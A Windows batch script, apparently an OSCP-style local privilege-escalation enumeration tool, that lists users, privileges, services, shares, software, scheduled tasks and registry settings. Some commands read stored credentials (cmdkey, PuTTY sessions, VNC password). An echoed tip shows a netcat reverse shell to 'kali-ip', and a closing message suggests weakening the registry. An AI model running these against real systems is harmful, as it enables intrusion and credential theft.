@echo off
setlocal enabledelayedexpansion

:: Color definitions
set "RED=[91m"
set "GREEN=[92m"
set "YELLOW=[93m"
set "BLUE=[94m"
set "MAGENTA=[95m"
set "CYAN=[96m"
set "WHITE=[97m"
set "RESET=[0m"
set "BOLD=[1m"

for /f %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"
<nul set /p "=%ESC%[?25l"

echo %BOLD%%GREEN% ===Local Enumeration Script===
echo       Author: Muharram Ali
echo       Email: ali.oscp@proton.me
echo       Version: 2025.1
echo.

echo [*] Starting System Enumeration%RESET%
echo.

echo %BOLD%%BLUE%**** Basic System Identification ******************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"%RESET%
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%hostname%RESET%
hostname
echo.

echo %BOLD%%BLUE%**** Current User Information *********************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%whoami /user%RESET%
whoami /user & whoami /priv
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net user "%USERNAME%"%RESET%
echo %YELLOW% Current user properties. check for logon scripts etc%RESET%
net user "%USERNAME%"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%whoami /groups%RESET%
echo %YELLOW% Current user belongs to the below local groups%RESET%
whoami /groups
echo.

echo %YELLOW%[Command]%RESET% %GREEN%whoami /groups | findstr -i share"%RESET%
whoami /groups | findstr -i share
echo.

echo %YELLOW%[Command]%RESET% %GREEN%query user%RESET%
query user
echo.

echo %BOLD%%BLUE%**** User and Group Information ******************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%net user%RESET%
net user
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net localgroup%RESET%
net localgroup
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net localgroup administrators%RESET%
net localgroup administrators
echo.

echo %YELLOW%[Command]%RESET% %GREEN%cmdkey /list%RESET%
cmdkey /list
echo.

echo %BOLD%%BLUE%****if cmdkey is listed, you can run commands based on the user permission. see below example.%RESET%
echo %BOLD%%BLUE%****runas /savecred /user:Administrator "nc.exe -nv kali-ip 4445 -e cmd.exe" or Powershell from nishang.%RESET%
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net user /domain%RESET%
net user /domain 2>nul | findstr /v "The request will be processed at a domain controller"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%net group /domain%RESET%
net group /domain 2>nul | findstr /v "The request will be processed at a domain controller"
echo.

echo %BOLD%%BLUE%**** Privilege Checks ************************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%Checking SeImpersonatePrivilege%RESET%
whoami /priv | findstr "SeImpersonatePrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeDebugPrivilege%RESET%
whoami /priv | findstr "SeDebugPrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeTakeOwnershipPrivilege%RESET%
whoami /priv | findstr "SeTakeOwnershipPrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeManageVolumePrivilege%RESET%
whoami /priv | findstr "SeManageVolumePrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking SeRestorePrivilege%RESET%
whoami /priv | findstr "SeRestorePrivilege"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking for local service account%RESET%
whoami | findstr "local service"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking for service accounts%RESET%
whoami | findstr "svc"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking Backup Operators membership%RESET%
whoami /groups | findstr "Backup Operators" 
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking DnsAdmins membership%RESET%
whoami /groups | findstr "DnsAdmins"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking Print Operators membership%RESET%
whoami /groups | findstr "Print Operators"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking Server Operators membership%RESET%
whoami /groups | findstr "Server Operators"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%Checking GPO Admins membership%RESET%
whoami /groups | findstr "GPO Admins"
echo.

echo %BOLD%%BLUE%**** Running Processes as NT AUTHORITY SYSTEM ************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%tasklist /v /fi "username eq system"%RESET%
tasklist /v /fi "username eq system"
echo.

echo %BOLD%%BLUE%**** Local Network Shares ********************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%net view \\127.0.0.1%RESET%
net view \\127.0.0.1 >nul 2>&1 && net view \\127.0.0.1
echo.

echo %BOLD%%BLUE%**** Network Connections *********************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%netstat -ano | findstr LISTENING%RESET%
netstat -ano | findstr LISTENING
echo.

echo %YELLOW%[Command]%RESET% %GREEN%netstat -ano | findstr ESTABLISHED%RESET%
netstat -ano | findstr ESTABLISHED
echo.

echo %BOLD%%BLUE%**** Installed Software (Non-Microsoft) ******************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%wmic product get name,version,vendor | findstr /v /i "Microsoft Corporation"%RESET%
wmic product get name,version,vendor | findstr /v /i "Microsoft Corporation"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%powershell -c "Get-ChildItem -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE' | ft Name"%RESET%
powershell -c "Get-ChildItem -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE' | ft Name"
echo.

echo %BOLD%%BLUE%**** Program Files Enumeration (x86) *********************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%dir "C:\Program Files (x86)"%RESET%
dir "C:\Program Files (x86)" 2>nul | findstr /V /I /C:"Microsoft" /C:"Windows"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%dir "C:\Program Files"%RESET%
dir "C:\Program Files" 2>nul | findstr /V /I /C:"Microsoft" /C:"Windows"
echo.

echo %BOLD%%BLUE%**** Scheduled Tasks (Non-Microsoft) ********************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%schtasks /query /fo LIST%RESET%
schtasks /query /fo LIST 2>nul | findstr TaskName | findstr /v /i Microsoft
echo.

echo %YELLOW%[Command]%RESET% %GREEN%powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '*Microsoft*'} | ft TaskName,TaskPath,State"%RESET%
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '*Microsoft*'} | ft TaskName,TaskPath,State"
echo.

echo %BOLD%%BLUE%**** Startup Programs *********************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%powershell -c "Get-CimInstance Win32_StartupCommand | select Name,Command,Location,User | fl"%RESET%
powershell -c "Get-CimInstance Win32_StartupCommand | select Name,Command,Location,User | fl"
echo.

echo %BOLD%%BLUE%**** Registry Enumeration ******************************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"%RESET%
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password%RESET%
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential%RESET%
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CACHEDLOGONSCOUNT%RESET%
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CACHEDLOGONSCOUNT 2>nul | findstr /v /i "ERROR"
echo.

echo %BOLD%%BLUE%**** AlwaysInstallElevated Checks ***********************************************************************%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%reg query "HKCU\Software\Policies\Microsoft\Windows\Installer"%RESET%
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query "HKLM\Software\Policies\Microsoft\Windows\Installer"%RESET%
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated%RESET%
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul | findstr /v /i "ERROR"
echo.

echo %YELLOW%[Command]%RESET% %GREEN%reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated%RESET%
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul | findstr /v /i "ERROR"
echo.

echo %BOLD%%RED%+++++++++++Search Recyclebins +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%RESET%
echo %YELLOW%[Command]%RESET% %GREEN%wmic useraccount get name,sid%RESET%
echo  %YELLOW%And then dir C:\$Recycle.Bin\SID%RESET%
wmic useraccount get name,sid
echo.

echo %BOLD%%RED%+++++++++++ Go Beyond +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%RESET%
echo %BOLD%[!!]%RESET%%RED% Nothing Found!%RESET%
echo %GREEN%[+]%RESET% Try to add reg key manually to make the system vulnerable to priv escalation. check gitbook 12.2
echo.

echo %BOLD%%GREEN%[*] Enumeration Complete%RESET%
<nul set /p "=%ESC%[?25h"
endlocal




